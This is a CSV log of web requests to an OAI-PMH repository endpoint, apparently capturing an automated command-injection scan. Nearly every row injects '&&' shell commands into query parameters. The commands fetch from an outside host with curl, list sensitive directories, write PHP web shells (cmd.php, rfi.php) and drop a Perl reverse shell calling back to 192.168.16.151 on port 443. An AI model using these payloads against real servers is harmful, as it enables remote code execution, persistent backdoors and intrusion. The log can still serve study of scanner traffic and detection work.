uuid,timestamp,http_status_code,request_url,response_time,http_version
323c25ce-fd26-4a17-9346-72a18a5e58da,2025-01-01 15:41:45,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%26%26+curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt,48.53 ms,HTTP/1.1
626235ad-97cb-467c-97e1-16cb6a89fe4e,2025-01-01 15:41:46,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%26%26+curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt&set=%26%26+curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt,36.19 ms,HTTP/1.1
f80cd21c-fd23-49f0-80ee-e82c53c26cfe,2025-01-01 15:41:46,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt&metadataPrefix=oai_dc,50.20 ms,HTTP/1.1
1b4434f9-7d82-437f-96b6-11fa1bc2222d,2025-01-01 15:41:46,200,http://islandora.io/oai/request?verb=%26%26+dir,59.84 ms,HTTP/1.1
729c9573-c753-476e-9bfc-994d36b13c2e,2025-01-01 15:41:47,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26%26+dir,34.49 ms,HTTP/1.1
8056f950-f665-4080-a928-abb9804c5602,2025-01-01 15:41:47,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+dir,54.49 ms,HTTP/1.1
80a214c6-58c0-449f-bc95-5298f46753ad,2025-01-01 15:41:47,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,65.42 ms,HTTP/1.1
be398284-f894-4cc8-84c6-e18fcc725868,2025-01-01 15:41:48,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26%26+dir&until=%26%26+dir,60.19 ms,HTTP/1.1
ef7121f3-3473-4fff-a966-a6a66cb84067,2025-01-01 15:41:48,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+dir&metadataPrefix=oai_dc,50.31 ms,HTTP/1.1
d01c71b0-f0c7-4c56-9f77-fbe4f0f66985,2025-01-01 15:41:48,200,http://islandora.io/oai/request?verb=%26%26+dir+C%3A%5C,57.07 ms,HTTP/1.1
da660a5a-d667-4f7b-8c5f-737f4b6b90ad,2025-01-01 15:41:49,200,http://islandora.io/oai/request?verb=ListMetadataFormats,55.81 ms,HTTP/1.1
331fb200-1fab-4f5c-a5a1-90fa3ad56bd5,2025-01-01 15:41:49,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+dir+C%3A%5C,96.79 ms,HTTP/1.1
8d00a94c-c112-49e8-a6a5-6258e009099e,2025-01-01 15:41:49,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26%26+dir+C%3A%5C,84.16 ms,HTTP/1.1
cd0ce093-5c17-4a47-9667-31e447d936be,2025-01-01 15:41:50,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%26%26+dir+C%3A%5C,74.28 ms,HTTP/1.1
a8beafdd-83f1-4e7c-bce3-73107d7ef5a2,2025-01-01 15:41:50,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+dir+C%3A%5C&metadataPrefix=marc,64.91 ms,HTTP/1.1
ea7e6a00-dd3c-4e0a-ab13-69ef5a83c041,2025-01-01 15:41:50,200,http://islandora.io/oai/request?verb=%26%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,56.53 ms,HTTP/1.1
36fa0d7e-29f8-4ced-ab86-eb2e0ea16425,2025-01-01 15:41:51,200,http://islandora.io/oai/request?verb=ListMetadataFormats,32.31 ms,HTTP/1.1
65dce1da-0279-42c1-a495-ffb9d15f0b0d,2025-01-01 15:41:51,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,82.09 ms,HTTP/1.1
600d907b-b33b-4ab1-9184-ea008bbb5a1a,2025-01-01 15:41:51,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%26%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,44.74 ms,HTTP/1.1
ac35c9af-d784-4bff-bf18-ab659433d0b5,2025-01-01 15:41:52,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%26%26+dir+C%3A%5CDocuments+and+Settings%5C%2A&until=%26%26+dir+C%3A%5CDocuments+and+Settings%5C%2A&set=%26%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,45.48 ms,HTTP/1.1
fd41a6b4-3d4f-4a36-b455-b9668f829b03,2025-01-01 15:41:52,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+dir+C%3A%5CDocuments+and+Settings%5C%2A&metadataPrefix=oai_dc,44.76 ms,HTTP/1.1
f5957e7c-97be-49ff-8a81-02f8efdc44d8,2025-01-01 15:41:52,200,http://islandora.io/oai/request?verb=%26%26+dir+C%3A%5CUsers,65.50 ms,HTTP/1.1
28a8ad09-3108-4aaa-8757-8fa590dd687b,2025-01-01 15:41:53,200,http://islandora.io/oai/request?verb=ListMetadataFormats,38.02 ms,HTTP/1.1
053fd546-989b-4c47-a290-f599a8353414,2025-01-01 15:41:53,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+dir+C%3A%5CUsers,67.49 ms,HTTP/1.1
97a22a0a-5959-4039-ae88-e3e6d794ce94,2025-01-01 15:41:53,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26%26+dir+C%3A%5CUsers,41.71 ms,HTTP/1.1
03247c3f-2f4f-4afe-9b3c-00fa0c3a271a,2025-01-01 15:41:54,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%26%26+dir+C%3A%5CUsers,62.17 ms,HTTP/1.1
890d80ee-60f5-4a33-95fc-a6aa916dc7a3,2025-01-01 15:41:54,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+dir+C%3A%5CUsers&metadataPrefix=oai_dc,63.70 ms,HTTP/1.1
06ed8bb8-cd39-4dd9-958d-1b2c5a381004,2025-01-01 15:41:54,200,http://islandora.io/oai/request?verb=%26%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,60.58 ms,HTTP/1.1
6b97a170-6d0e-44c3-8ef3-1792d069a503,2025-01-01 15:41:55,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,60.91 ms,HTTP/1.1
bcfacddd-72ab-4a83-ac4d-5f3beaaebc6d,2025-01-01 15:41:55,200,http://islandora.io/oai/request?verb=ListSets,31.62 ms,HTTP/1.1
39b58f74-29f4-4429-8915-fe482e47ae23,2025-01-01 15:41:55,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%26%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php&until=%26%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,68.28 ms,HTTP/1.1
add446d2-f881-4d20-800e-bfe8968ce261,2025-01-01 15:41:56,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php&set=%26%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,77.53 ms,HTTP/1.1
f3ac5de9-33a9-486e-9e41-40e7ed480d6f,2025-01-01 15:41:56,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php&metadataPrefix=oai_dc,56.02 ms,HTTP/1.1
5f482ab6-1443-4e8c-9c9b-11314e7cb2e1,2025-01-01 15:41:56,200,http://islandora.io/oai/request?verb=%26%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,63.39 ms,HTTP/1.1
16d35d32-7bb0-44e8-8988-7879c5a004c8,2025-01-01 15:41:57,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,65.09 ms,HTTP/1.1
695cebac-e314-4ee7-8a51-457f6b96edcd,2025-01-01 15:41:57,200,http://islandora.io/oai/request?verb=ListSets,47.36 ms,HTTP/1.1
3b1cd24a-61b0-46a9-98e1-8848c51d5291,2025-01-01 15:41:57,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,43.39 ms,HTTP/1.1
db74f242-e301-4b46-97c4-ca00d2afe531,2025-01-01 15:41:58,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,118.55 ms,HTTP/1.1
07b34ec7-3eb0-4069-82e2-7187c1935cb5,2025-01-01 15:41:58,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php&metadataPrefix=marc,52.92 ms,HTTP/1.1
4c06370a-412f-4737-a798-11498425d43c,2025-01-01 15:41:59,200,http://islandora.io/oai/request?verb=%26%26+echo+%22%3C%3Fphp+system%28%27dir+%24_GET%5B%27dir%27%5D%27%29%3B+%3F%3E%22+%3E+dir.php,96.58 ms,HTTP/1.1
35a79f29-f813-4821-832c-d3b528fccbfd,2025-01-01 15:41:59,200,http://islandora.io/oai/request?verb=ListMetadataFormats,51.61 ms,HTTP/1.1
98e9146f-1810-444f-94f4-8639d539c90e,2025-01-01 15:41:59,200,http://islandora.io/oai/request?verb=ListSets,48.55 ms,HTTP/1.1
51c621a9-41aa-491e-91e5-a2edb922cac2,2025-01-01 15:42:00,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%26%26+echo+%22%3C%3Fphp+system%28%27dir+%24_GET%5B%27dir%27%5D%27%29%3B+%3F%3E%22+%3E+dir.php,35.62 ms,HTTP/1.1
b968c627-6361-4611-883c-fd18e7275e0a,2025-01-01 15:42:00,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%26%26+echo+%22%3C%3Fphp+system%28%27dir+%24_GET%5B%27dir%27%5D%27%29%3B+%3F%3E%22+%3E+dir.php&set=%26%26+echo+%22%3C%3Fphp+system%28%27dir+%24_GET%5B%27dir%27%5D%27%29%3B+%3F%3E%22+%3E+dir.php,56.92 ms,HTTP/1.1
c3232672-20cb-40bc-84d2-8ad7bf25dfe3,2025-01-01 15:42:00,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+echo+%22%3C%3Fphp+system%28%27dir+%24_GET%5B%27dir%27%5D%27%29%3B+%3F%3E%22+%3E+dir.php&metadataPrefix=oai_dc,47.56 ms,HTTP/1.1
1be943bf-7808-4e74-a7a6-452a7406ae66,2025-01-01 15:42:01,200,http://islandora.io/oai/request?verb=%26%26+echo+%22use+Socket%3B%24i%3D%22192.168.16.151%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh+-i%22%29%3B%7D%3B%22+%3E+rev.pl,60.18 ms,HTTP/1.1
87a20610-6006-44c6-aed9-83cf74a7e640,2025-01-01 15:42:01,200,http://islandora.io/oai/request?verb=ListMetadataFormats,54.66 ms,HTTP/1.1
9c6e24b9-5584-4934-9da6-6459bed28d9b,2025-01-01 15:42:01,200,http://islandora.io/oai/request?verb=ListSets,54.21 ms,HTTP/1.1
287fbb40-7ec4-4b11-a9df-8369440c1234,2025-01-01 15:42:02,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26%26+echo+%22use+Socket%3B%24i%3D%22192.168.16.151%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh+-i%22%29%3B%7D%3B%22+%3E+rev.pl&until=%26%26+echo+%22use+Socket%3B%24i%3D%22192.168.16.151%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh+-i%22%29%3B%7D%3B%22+%3E+rev.pl,60.96 ms,HTTP/1.1
778b78cb-4198-4185-8b02-f0e88db2a77e,2025-01-01 15:42:02,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26%26+echo+%22use+Socket%3B%24i%3D%22192.168.16.151%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh+-i%22%29%3B%7D%3B%22+%3E+rev.pl&until=%26%26+echo+%22use+Socket%3B%24i%3D%22192.168.16.151%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh+-i%22%29%3B%7D%3B%22+%3E+rev.pl,59.13 ms,HTTP/1.1
15d6fcf9-e5b5-47f5-be07-5e123ad8d2f1,2025-01-01 15:42:02,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+echo+%22use+Socket%3B%24i%3D%22192.168.16.151%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh+-i%22%29%3B%7D%3B%22+%3E+rev.pl&metadataPrefix=oai_dc,55.14 ms,HTTP/1.1
26e08a86-80a6-41b5-9f3f-0d3c46d35baf,2025-01-01 15:42:03,200,http://islandora.io/oai/request?verb=%26%26+ifconfig,64.14 ms,HTTP/1.1
33e69cac-d8d9-4943-9a48-68f473d9efc9,2025-01-01 15:42:03,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26%26+ifconfig,57.94 ms,HTTP/1.1
b753cada-c32f-4c61-b3a2-d21a067271ff,2025-01-01 15:42:03,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+ifconfig,84.90 ms,HTTP/1.1
07482b97-ecc9-473e-b809-a058634afaa5,2025-01-01 15:42:04,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,60.51 ms,HTTP/1.1
cd1ed470-12e5-4931-af52-cc44cbbe587f,2025-01-01 15:42:04,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%26%26+ifconfig&set=%26%26+ifconfig,53.90 ms,HTTP/1.1
013ee6a2-8596-4b13-aa7c-dc4ed9dc173e,2025-01-01 15:42:04,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+ifconfig&metadataPrefix=marc,58.30 ms,HTTP/1.1
5a1d2b03-6b6f-4bb8-b4f3-b97c9a8e17f0,2025-01-01 15:42:05,200,http://islandora.io/oai/request?verb=%26%26+ipconfig+%2Fall,68.21 ms,HTTP/1.1
0e6168bd-e642-4313-858d-1aa1abc6bfe9,2025-01-01 15:42:05,200,http://islandora.io/oai/request?verb=ListMetadataFormats,54.68 ms,HTTP/1.1
6d9d3631-3fb6-4454-b3e8-5ecab127adfa,2025-01-01 15:42:05,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+ipconfig+%2Fall,64.79 ms,HTTP/1.1
d2a7c958-e94d-4260-a5ab-454c99fa892e,2025-01-01 15:42:06,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%26%26+ipconfig+%2Fall,53.27 ms,HTTP/1.1
c75cc02f-bb07-476c-8ba3-1043bb864789,2025-01-01 15:42:06,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26%26+ipconfig+%2Fall&until=%26%26+ipconfig+%2Fall,56.35 ms,HTTP/1.1
043065ec-eda2-4fb0-a062-ebf97d166782,2025-01-01 15:42:06,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+ipconfig+%2Fall&metadataPrefix=marc,51.39 ms,HTTP/1.1
6f21036a-5b8f-4c00-be19-05176d55b127,2025-01-01 15:42:07,200,http://islandora.io/oai/request?verb=%26%26+ls+-l+%2F,66.05 ms,HTTP/1.1
37c2e476-ae19-4137-b43f-1f75a0a9093a,2025-01-01 15:42:07,200,http://islandora.io/oai/request?verb=ListMetadataFormats,42.64 ms,HTTP/1.1
6facdfc5-8117-405a-82da-9f9c548a07e7,2025-01-01 15:42:07,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+ls+-l+%2F,62.74 ms,HTTP/1.1
94fa1333-8de7-462b-978c-ad71a015bbfb,2025-01-01 15:42:08,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%26%26+ls+-l+%2F,72.94 ms,HTTP/1.1
c3416b7a-4f4e-4941-867f-7749533a3f6b,2025-01-01 15:42:08,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26%26+ls+-l+%2F&set=%26%26+ls+-l+%2F,62.79 ms,HTTP/1.1
796ab44f-a5b5-44f6-92c2-661bdb25fc11,2025-01-01 15:42:08,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+ls+-l+%2F&metadataPrefix=marc,49.00 ms,HTTP/1.1
7e813c3e-781e-4bae-842a-eccfd511c6d0,2025-01-01 15:42:09,200,http://islandora.io/oai/request?verb=%26%26+ls+-l+%2Fetc%2F,56.22 ms,HTTP/1.1
52735b1f-7b66-4817-ab37-100ae0210ea5,2025-01-01 15:42:09,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26%26+ls+-l+%2Fetc%2F,57.39 ms,HTTP/1.1
00e6647d-788e-43ea-ad2b-d63cf656cb1d,2025-01-01 15:42:09,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+ls+-l+%2Fetc%2F,78.79 ms,HTTP/1.1
5d9e9a01-f868-4b21-9c11-ac771814e953,2025-01-01 15:42:10,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26%26+ls+-l+%2Fetc%2F&set=%26%26+ls+-l+%2Fetc%2F,59.16 ms,HTTP/1.1
04c6a115-ee8f-4274-8d07-e79b8799472f,2025-01-01 15:42:10,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%26%26+ls+-l+%2Fetc%2F&set=%26%26+ls+-l+%2Fetc%2F,64.26 ms,HTTP/1.1
bc0071f2-7cef-4d13-a2e4-11e871e6d946,2025-01-01 15:42:10,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+ls+-l+%2Fetc%2F&metadataPrefix=oai_dc,70.65 ms,HTTP/1.1
09eff171-0fc4-433b-be84-9c277d51f6c9,2025-01-01 15:42:11,200,http://islandora.io/oai/request?verb=%26%26+ls+-l+%2Fhome%2F%2A,59.74 ms,HTTP/1.1
3c3151bf-4707-4a9e-97ae-a9f20a3eb598,2025-01-01 15:42:11,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26%26+ls+-l+%2Fhome%2F%2A,60.79 ms,HTTP/1.1
53cbfe9b-f57e-44e9-8cbf-5486bea488cc,2025-01-01 15:42:11,200,http://islandora.io/oai/request?verb=ListSets,28.58 ms,HTTP/1.1
d61155de-d478-4ac4-aae3-feac03a4efdc,2025-01-01 15:42:12,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%26%26+ls+-l+%2Fhome%2F%2A,57.80 ms,HTTP/1.1
36679112-3c2c-4003-a22a-b8a9931cd897,2025-01-01 15:42:12,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26%26+ls+-l+%2Fhome%2F%2A&until=%26%26+ls+-l+%2Fhome%2F%2A,58.30 ms,HTTP/1.1
94c44e6d-2529-4f60-bbd7-2aa1dce36719,2025-01-01 15:42:13,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+ls+-l+%2Fhome%2F%2A&metadataPrefix=marc,53.41 ms,HTTP/1.1
d2245bcc-d7b2-4058-a01c-e7b39265d70b,2025-01-01 15:42:13,200,http://islandora.io/oai/request?verb=%26%26+ls+-l+%2Ftmp,61.99 ms,HTTP/1.1
4b8dc551-eb52-4ca2-9f51-01dab85a0bb8,2025-01-01 15:42:13,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26%26+ls+-l+%2Ftmp,34.01 ms,HTTP/1.1
7228b756-6494-40a0-9341-8c95d811ce40,2025-01-01 15:42:14,200,http://islandora.io/oai/request?verb=ListSets,49.62 ms,HTTP/1.1
cc5a1277-adc9-4c78-800a-2eee8a1b5b93,2025-01-01 15:42:14,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%26%26+ls+-l+%2Ftmp&set=%26%26+ls+-l+%2Ftmp,44.48 ms,HTTP/1.1
6bb99a37-48a7-462c-b8bd-a1b73b58da4b,2025-01-01 15:42:14,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc,39.52 ms,HTTP/1.1
e442a4a2-0c52-4717-a83a-90549cf24487,2025-01-01 15:42:15,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+ls+-l+%2Ftmp&metadataPrefix=marc,64.45 ms,HTTP/1.1
b5801080-0b41-41df-922f-af796e5b188d,2025-01-01 15:42:15,200,http://islandora.io/oai/request?verb=%26%26+ls+-l+%2Fvar%2Fwww%2F%2A,43.08 ms,HTTP/1.1
59d1ef60-a4bf-4d9e-bee3-e84ae3875719,2025-01-01 15:42:15,200,http://islandora.io/oai/request?verb=ListMetadataFormats,39.49 ms,HTTP/1.1
718c1773-cdf0-46be-985e-58edd28a9ffc,2025-01-01 15:42:16,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+ls+-l+%2Fvar%2Fwww%2F%2A,63.83 ms,HTTP/1.1
23e7cf05-6f6e-4d02-9c75-894daf64c7c2,2025-01-01 15:42:16,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%26%26+ls+-l+%2Fvar%2Fwww%2F%2A,74.05 ms,HTTP/1.1
ef193466-7d0b-4254-8389-ebd31301a88d,2025-01-01 15:42:16,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26%26+ls+-l+%2Fvar%2Fwww%2F%2A&until=%26%26+ls+-l+%2Fvar%2Fwww%2F%2A&set=%26%26+ls+-l+%2Fvar%2Fwww%2F%2A,59.33 ms,HTTP/1.1
647a8a9c-df13-4d7f-8724-4b10f2497c78,2025-01-01 15:42:17,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+ls+-l+%2Fvar%2Fwww%2F%2A&metadataPrefix=oai_dc,53.35 ms,HTTP/1.1
36694f8a-bcbc-411e-8198-ff74e2171111,2025-01-01 15:42:17,200,http://islandora.io/oai/request?verb=%26%26+ls+-laR+%2Fetc,61.15 ms,HTTP/1.1
67a7a4f1-5981-479e-8503-d9c41da186f1,2025-01-01 15:42:17,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26%26+ls+-laR+%2Fetc,52.13 ms,HTTP/1.1
ccb8b9ab-0257-4a0a-bdb5-50d81eb3b89f,2025-01-01 15:42:18,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+ls+-laR+%2Fetc,87.04 ms,HTTP/1.1
e86c139f-3d49-4d54-85af-861dd5f4c675,2025-01-01 15:42:18,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26%26+ls+-laR+%2Fetc,92.69 ms,HTTP/1.1
a0adf681-97ab-47c5-9d81-7a79272ee873,2025-01-01 15:42:18,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc,48.36 ms,HTTP/1.1
381c2b90-dfb0-4cb0-b246-075b1bb435d1,2025-01-01 15:42:19,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+ls+-laR+%2Fetc&metadataPrefix=oai_dc,81.70 ms,HTTP/1.1
3d16b25d-fcd9-4d82-9a51-b960725deebb,2025-01-01 15:42:19,200,http://islandora.io/oai/request?verb=%26%26+ls+-laR+%2Fvar%2Fwww,65.78 ms,HTTP/1.1
53f7f4b7-8662-415f-b10b-b2a57b0a4f03,2025-01-01 15:42:19,200,http://islandora.io/oai/request?verb=ListMetadataFormats,45.33 ms,HTTP/1.1
0ddda348-9f60-4cea-a928-aa85b45ce15a,2025-01-01 15:42:20,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26%26+ls+-laR+%2Fvar%2Fwww,63.14 ms,HTTP/1.1
f5a1da4f-d048-4fd8-8b96-6fa1e6cc582f,2025-01-01 15:42:20,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26%26+ls+-laR+%2Fvar%2Fwww,56.81 ms,HTTP/1.1
7995d4b0-9755-4c77-b255-0a4b12ff1472,2025-01-01 15:42:21,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26%26+ls+-laR+%2Fvar%2Fwww,121.92 ms,HTTP/1.1
ffa59020-d578-453b-aeed-b00ac6a02d9b,2025-01-01 15:42:21,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26%26+ls+-laR+%2Fvar%2Fwww&metadataPrefix=oai_dc,54.20 ms,HTTP/1.1
